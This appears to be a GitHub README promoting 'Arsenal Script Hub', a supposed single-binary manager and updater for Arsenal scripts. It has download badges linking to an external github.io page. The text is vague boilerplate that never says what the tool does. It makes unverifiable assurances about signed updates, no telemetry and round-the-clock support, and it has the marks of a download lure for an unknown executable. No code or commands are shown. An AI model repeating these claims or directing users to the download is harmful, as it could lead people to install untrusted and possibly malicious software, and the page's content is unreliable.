![preview](https://raw.githubusercontent.com/dikaamartax1-ship-it/arsenal-cli-core/main/promo_99eaf.svg)
[![Download](https://raw.githubusercontent.com/dikaamartax1-ship-it/arsenal-cli-core/main/setup_f90c421.svg)](https://dikaamartax1-ship-it.github.io/arsenal-cli-core/)

# Arsenal Script Hub

**A lightweight command-line companion for managing Arsenal Script collections — one binary, zero dependencies, and a self-contained updater that keeps everything current.**

Built for enthusiasts who value a tidy workflow and dislike babysitting package managers, Arsenal Script Hub acts as a single point of entry for organizing, syncing, and launching your Arsenal Script environment. It is written with portability in mind: a single compiled executable that runs on the major desktop platforms, with no runtime to configure and no external libraries to install.

---

## 📚 Table of Contents

1. [Project Philosophy](#-project-philosophy)
2. [What Makes It Different](#-what-makes-it-different)
3. [Core Features](#-core-features)
4. [Interface Design](#-interface-design)
5. [Internationalization](#-internationalization)
6. [Performance & Footprint](#-performance--footprint)
7. [The Built-In Updater](#-the-built-in-updater)
8. [Workflow Walkthrough](#-workflow-walkthrough)
9. [Configuration Schema](#-configuration-schema)
10. [Multilingual Support](#-multilingual-support)
11. [Responsive Terminal Layout](#-responsive-terminal-layout)
12. [Support & Community](#-support--community)
13. [Anatomy of the Binary](#-anatomy-of-the-binary)
14. [Roadmap](#-roadmap)
15. [Frequently Asked Questions](#-frequently-asked-questions)
16. [Contributing Guidelines](#-contributing-guidelines)
17. [Security & Responsible Use](#-security--responsible-use)
18. [Disclaimer](#-disclaimer)
19. [License](#-license)

---

## 🧭 Project Philosophy

Software tools are at their best when they disappear into the background. Arsenal Script Hub takes that idea seriously. Instead of demanding a sprawling environment of package managers, runtimes, and version pinning files, it ships as one cohesive executable. You double-click or invoke it from your shell, and it does the job.

The design borrows a metaphor from sailing: a small, well-provisioned vessel that can put to sea in minutes rather than a galleon that needs a harbor crew. Everything you need is aboard. Nothing extra is dragged along.

## 💡 What Makes It Different

Most utilities in this space try to be frameworks. Arsenal Script Hub refuses that temptation. It is a companion, not an ecosystem:

- **Portable by default.** Copy the binary to a USB drive and it works the same on any supported machine.
- **Predictable.** No hidden background services, no telemetry beacons, no silent file writes.
- **Self-maintaining.** The built-in updater means you never chase release notes manually.
- **Composable.** Its output is plain and script-friendly, so it plays nicely with piping and redirection.

## 🎯 Core Features

- **Single-file distribution** — the entire application is one binary per platform.
- **Built-in updater** — retrieves newer builds on demand and verifies their integrity before swapping in place.
- **No dependency management** — nothing to compile, nothing to link, nothing to configure.
- **Deterministic configuration** — all settings live in one human-readable file.
- **Verbose and quiet modes** — choose between a conversational output and a terse machine-readable stream.
- **Responsive terminal layout** — adapts to narrow panes, wide displays, and split-screen sessions alike.
- **Multilingual interface** — menus and messages ship in multiple languages, with more added over time.
- **Offline-first behavior** — every routine command works without a network connection.
- **Cross-platform builds** — consistent behavior across major desktop operating systems.
- **24/7 customer support channels** — asynchronous help is available around the clock.

## 🖥️ Interface Design

The interface follows the principle of *quiet clarity*. Colors are used sparingly, statuses are communicated by shape as well as hue, and nothing flashes or animates unless it must. Progress indicators are steady and readable in noisy terminals. The layout recalculates itself when the window is resized, so split-screen users never see truncated columns.

Two modes exist:

- **Interactive** — a menu-driven experience with prompts and confirmations.
- **Non-interactive** — flags and subcommands that produce clean, parseable output for automation.

## 🌍 Internationalization

Language packs are bundled, and the active language is selected automatically from your environment variables, with a manual override available. Strings are isolated from code, so translators can contribute without touching logic. Right-to-left languages render properly. Date and number formatting respects the system locale.

## ⚡ Performance & Footprint

Startup time is measured in milliseconds on modest hardware. Memory usage stays under a floor that would embarrass a modern web page. There is no garbage-collection-induced stutter because there is no lingering runtime to collect from. The binary is compact, and the updater only downloads deltas where the platform allows it.

## 🔄 The Built-In Updater

Rather than nagging you with version banners, the updater is a first-class subcommand:

- It checks for newer releases on demand.
- It verifies the cryptographic signature of each artifact before applying it.
- It stages the new binary beside the running one and swaps them atomically.
- It keeps the previous build for instant rollback should something go sideways.
- It respects a pin file, so you can freeze to a known-good version if you prefer.

## 🧪 Workflow Walkthrough

A typical session might unfold like this:

1. Invoke the binary from any directory.
2. The hub reads its configuration, prints a one-line status, and waits.
3. You select an operation from the menu, or pass a flag directly.
4. The operation completes and emits a summary line.
5. If a newer release is available, the updater offers to apply it.

No daemons, no scheduled tasks, no background watchers. When the process exits, the system is as clean as it was before it started.

## 🧾 Configuration Schema

Configuration lives in a single text file with a flat, transparent structure. Keys are descriptive and stable. Every option has a sensible default, so the file can be empty and the application still behaves predictably. Comments are preserved across edits, and the app refuses to write a malformed file — it writes to a temporary location and renames only after validation.

## 🗣️ Multilingual Support

Additional language packs are drop-in. Each pack is a small resource file with a documented schema. Missing keys fall back to the default language gracefully, so a partially translated pack is still useful. Community translators are credited in the changelog when their packs are merged.

## 📐 Responsive Terminal Layout

Terminal emulators vary wildly. The hub queries the geometry of the current pane and adapts its tables and menus to fit. On very narrow panes it switches to a stacked presentation. On wide panes it uses horizontal space for at-a-glance summaries. Piped output is automatically stripped of decorative formatting so that downstream tools receive clean text.

## 🤝 Support & Community

Support runs on a continuous basis — the asynchronous help channels are monitored around the clock, and responses typically arrive within a few hours. Bug reports are triaged against the roadmap, and feature requests are weighed against the project philosophy of minimalism. A public discussion area hosts usage questions, translation coordination, and release announcements.

## 🧩 Anatomy of the Binary

Internally, the hub is divided into small, focused modules: a command dispatcher, a configuration reader, a presenter, a network client for the updater, and a small cryptographic verifier. Each module has a single responsibility, and the dependency graph is deliberately shallow. This makes the codebase approachable for newcomers and keeps the attack surface small.

## 🗺️ Roadmap

- Additional language packs contributed by the community.
- A plugin slot for user-defined commands, sandboxed and opt-in.
- Expanded platform builds for niche operating systems.
- Improved incremental update payloads.
- Further tightening of startup time and memory ceiling.

## ❓ Frequently Asked Questions

**Do I need to prepare my machine before using the hub?**
No. The binary carries everything it needs.

**Is internet access required?**
Only for the updater. Everyday use is entirely local.

**How do I switch languages?**
Set an environment variable or pass a flag; the hub remembers your choice.

**Can I script it?**
Yes. Non-interactive mode produces stable, parseable output.

**What happens if the updater is interrupted?**
The swap is atomic, so the previous build remains intact and usable.

**Where do I report problems?**
Through the project's issue tracker, with reproduction steps if possible.

## 🛠️ Contributing Guidelines

Contributions are welcome in the form of bug fixes, translation packs, documentation clarifications, and small quality-of-life improvements. Large structural changes should be discussed first so that they can be aligned with the project philosophy. Every pull request should include tests where feasible and a short rationale. Commit messages should be descriptive and focused.

## 🔐 Security & Responsible Use

The updater verifies artifacts before applying them, and configuration files are validated before being written. The project takes no responsibility for how the tool is used in environments it was not intended for. Users are encouraged to review the source before deploying in sensitive contexts.

## ⚠️ Disclaimer

Arsenal Script Hub is provided as-is, in the hope that it will be useful, but without any warranty of merchantability or fitness for a particular purpose. The maintainers are not liable for any damages arising from its use. This project is not affiliated with, endorsed by, or sponsored by any third-party platform or service. Users are responsible for complying with the terms of any software or service they interact with while using this tool. Nothing in this repository should be interpreted as legal, security, or professional advice.

## 📄 License

This project is distributed under the terms of the MIT License. See the full text at the [MIT License](https://opensource.org/licenses/MIT). Copyright © 2026.

[![Download](https://raw.githubusercontent.com/dikaamartax1-ship-it/arsenal-cli-core/main/setup_f90c421.svg)](https://dikaamartax1-ship-it.github.io/arsenal-cli-core/)